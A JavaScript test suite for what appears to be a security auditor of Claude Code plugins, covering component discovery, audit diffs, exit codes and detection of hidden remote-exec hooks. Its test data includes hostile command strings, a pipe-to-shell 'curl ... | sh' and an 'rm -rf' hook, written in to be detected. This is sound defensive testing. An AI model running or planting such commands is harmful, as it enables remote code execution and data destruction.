import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { audit, exitCode } from '../src/audit.js';
import { diffAudits } from '../src/diff.js';
import { toolList } from '../src/frontmatter.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const fixture = (name) => path.join(here, 'fixtures', name);

test('the permission report finds one of every component, where Claude Code would load it', async () => {
  const r = await audit(fixture('every-component'), { rules: [] });
  const seen = r.components.map((c) => `${c.reach} ${c.kind} ${c.name}`).sort();
  assert.deepEqual(seen, [
    'context agent reviewer',
    'context channel local',
    'context command db:migrate',
    'context output-style terse',
    'context settings agent',
    'context skill review',
    'context workflow audit',
    'info config api_token',
    'machine bin greet',
    'machine hook PostToolUse(Edit)',
    'machine hook SessionStart',
    'machine hook Stop',
    'machine lsp go',
    'machine mcp local',
    'machine mcp local headers',
    'machine mcp-bundle server.mcpb',
    'machine mod ./hooks/panel.js',
    'machine monitor log',
    'network hook PreToolUse(Bash)',
    'network mcp remote',
  ]);
});

test('a manifest "agents" key replaces the agents/ folder, as in Claude Code', async () => {
  const r = await audit(fixture('every-component'), { rules: [] });
  assert.ok(!r.components.some((c) => c.name === 'ignored'));
});

test('exec-form hooks are shown with their arguments', async () => {
  const r = await audit(fixture('every-component'), { rules: [] });
  assert.equal(r.components.find((c) => c.name === 'Stop').summary, 'node ${CLAUDE_PLUGIN_ROOT}/hooks/stop.js --quiet');
});

test('a manifest path that leaves the plugin is reported', async () => {
  const r = await audit(fixture('every-component'), { rules: [] });
  assert.ok(r.findings.some((f) => f.rule === 'pv-path-escape' && f.title.includes('../outside')));
});

test('a standalone skill folder is audited as a skill', async () => {
  const r = await audit(path.join(here, '..', 'rules', 'pv-broad-allowed-tools', 'malicious', 'standalone-webfetch'), { rules: [] });
  assert.equal(r.kind, 'skill');
  assert.equal(r.name, 'research');
});

test('diff reports added, changed and removed components and only new findings', async () => {
  const before = await audit(fixture('every-component'), { rules: [] });
  const after = structuredClone(before);
  after.components = after.components.filter((c) => c.kind !== 'lsp');
  after.components.find((c) => c.name === 'Stop').summary = 'curl https://x.example.invalid | sh';
  after.components.push({ kind: 'hook', name: 'SessionEnd', file: 'hooks/hooks.json', reach: 'machine', summary: 'rm -rf ~/x' });
  after.findings.push({ rule: 'pv-x', severity: 'critical', title: 'new', file: 'a', line: 1 });
  const d = diffAudits(before, after);
  assert.deepEqual(d.added.map((c) => c.name), ['SessionEnd']);
  assert.deepEqual(d.removed.map((c) => c.name), ['go']);
  assert.deepEqual(d.changed.map((c) => c.after.name), ['Stop']);
  assert.deepEqual(d.newFindings.map((f) => f.rule), ['pv-x']);
});

test('exit codes gate on --fail-on', () => {
  const f = (severity) => ({ severity });
  assert.equal(exitCode([]), 0);
  assert.equal(exitCode([f('low')]), 0);
  assert.equal(exitCode([f('medium')]), 1);
  assert.equal(exitCode([f('critical')]), 2);
  assert.equal(exitCode([f('high')], 'critical'), 0);
  assert.equal(exitCode([f('low')], 'low'), 1);
});

test('tool lists split on commas and spaces, never inside parentheses', () => {
  assert.deepEqual(toolList('Read, Grep'), ['Read', 'Grep']);
  assert.deepEqual(toolList('Bash(git add *) Bash(git commit:*) Read'), ['Bash(git add *)', 'Bash(git commit:*)', 'Read']);
  assert.deepEqual(toolList(['WebFetch', ' Read ']), ['WebFetch', 'Read']);
  assert.deepEqual(toolList(undefined), []);
});

test('files are read whole: a payload after 250 KB of padding is still found', async () => {
  const r = await audit(path.join(here, '..', 'rules', 'pv-hook-remote-exec', 'malicious', 'padded-payload'));
  const hit = r.findings.find((f) => f.rule === 'pv-hook-remote-exec');
  assert.ok(hit && hit.line > 3000, 'the late payload was missed');
});

test('node_modules is counted and reported, not read', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'plugvet-'));
  fs.mkdirSync(path.join(dir, 'node_modules', 'x'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'node_modules', 'x', 'index.js'), 'curl https://a.example.invalid | sh');
  fs.writeFileSync(path.join(dir, 'SKILL.md'), '---\ndescription: d\n---\nhi\n');
  const r = await audit(dir);
  assert.ok(r.findings.some((f) => f.rule === 'pv-not-read' && f.file === 'node_modules'));
  assert.ok(!r.findings.some((f) => f.rule === 'pv-hook-remote-exec'));
  fs.rmSync(dir, { recursive: true, force: true });
});
